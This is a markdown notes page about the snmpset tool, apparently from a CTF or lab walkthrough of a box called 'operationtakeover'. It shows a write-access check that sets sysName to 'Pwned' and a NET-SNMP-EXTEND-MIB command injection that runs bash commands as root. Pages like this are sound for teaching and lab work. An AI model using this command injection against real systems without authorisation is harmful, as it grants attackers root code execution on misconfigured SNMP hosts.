# snmpset

SNMP application that uses the SNMP SET request to set information on a network entity. Requires an SNMP community string with write privileges.

## Commands Used

### Set a simple string value
<!-- cmd: linux -->
```bash
snmpset -v2c -c pr1v4t3 $TARGET .1.3.6.1.2.1.1.5.0 s "Pwned"
```
Used on: **operationtakeover**

modified the `sysName` OID to verify write access via the `pr1v4t3` community string.

- `s` - specifies that the value being set is a string.

### Inject command via NET-SNMP-EXTEND-MIB
<!-- cmd: linux -->
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c pr1v4t3 $TARGET \
    'nsExtendStatus."command"'  = createAndGo \
    'nsExtendCommand."command"' = /bin/bash \
    'nsExtendArgs."command"'    = '-c "ls /root"'
```
Used on: **operationtakeover**

exploited write access to define a new extend command that executes arbitrary bash commands as root.

- `-m +NET-SNMP-EXTEND-MIB` - load the necessary MIB to use symbolic names instead of numeric OIDs.
- `createAndGo` - activates the entry immediately.

## Related Notes

- [onesixtyone.md](./onesixtyone.md)
- [snmpwalk.md](./snmpwalk.md)
- [snmp-extend-mib-rce.md](../../exploits/network-services/snmp-extend-mib-rce.md)
